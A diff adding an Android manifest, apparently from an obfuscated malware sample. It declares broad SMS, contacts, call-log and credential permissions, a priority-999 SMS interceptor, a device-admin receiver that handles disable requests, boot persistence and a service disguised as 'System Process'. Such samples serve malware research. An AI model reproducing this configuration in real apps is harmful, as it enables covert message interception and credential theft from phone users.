@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mktsylayo.teyhgn" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
+    <uses-permission android:name="com.sec.android.app.sbrowser.operatorbookmarks.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.BROADCAST_PACKAGE_ADDED"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.USE_CREDENTIALS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:name="com.dswkgs.asyelsue.dcpbrsie" android:theme="@style/Theme.Transparent">
+        <activity android:label="jhpgknha" android:name="com.mktsylayo.teyhgn.smjukco"/>
+        <activity android:excludeFromRecents="true" android:label="@string/app_name" android:name="com.mktsylayo.teyhgn.MainActivity" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="tgmipvym" android:name="com.mktsylayo.teyhgn.hydakjl"/>
+        <activity android:excludeFromRecents="true" android:name="com.mktsylayo.teyhgn.osphtmi" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:excludeFromRecents="true" android:label="" android:launchMode="singleTop" android:name="com.mktsylayo.teyhgn.cjeyr" android:theme="@style/AppMainTheme" android:windowSoftInputMode="adjustResize"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:excludeFromRecents="true" android:label="" android:launchMode="singleTop" android:name="com.mktsylayo.teyhgn.fqkukom" android:theme="@style/AppDialog" android:windowSoftInputMode="adjustResize"/>
+        <service android:name="com.mktsylayo.teyhgn.xvnialqiq"/>
+        <activity android:label="ufjzozrhcf" android:name="com.mktsylayo.teyhgn.yeongjmg"/>
+        <activity android:label="vjzgbwvso" android:name="com.mktsylayo.teyhgn.mxsuziht"/>
+        <receiver android:name="com.mktsylayo.teyhgn.iyzquk">
+            <intent-filter>
+                <action android:name="android.send.mms"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="jgxdtj" android:name="com.mktsylayo.teyhgn.oqfytvxdhf"/>
+        <receiver android:exported="false" android:name="com.mktsylayo.teyhgn.ndjnuky">
+            <intent-filter>
+                <action android:name="com.som"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="bpxkocpzt" android:name="com.mktsylayo.teyhgn.xgcrik"/>
+        <receiver android:enabled="true" android:name="com.mktsylayo.teyhgn.tswtvdj" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_SENT"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_SENT"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_SENT"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="lywtsecr" android:name="com.mktsylayo.teyhgn.gayms"/>
+        <receiver android:description="@string/admin_description" android:enabled="true" android:name="com.mktsylayo.teyhgn.vbagfcs" android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/empty"/>
+            <meta-data android:name="preventRestart" android:value="true"/>
+            <meta-data android:name="stopOnDeviceLock" android:value="false"/>
+            <intent-filter>
+                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="System Process" android:name="com.mktsylayo.teyhgn.bugvduf"/>
+        <service android:name="com.mktsylayo.teyhgn.avbukf"/>
+        <service android:enabled="true" android:name="com.mktsylayo.teyhgn.gvuca"/>
+        <receiver android:name="com.mktsylayo.teyhgn.usxswnkm">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="akdbyc" android:name="com.mktsylayo.teyhgn.fasehzflhc"/>
+        <service android:name="com.mktsylayo.teyhgn.cdgxig"/>
+    </application>
+</manifest>
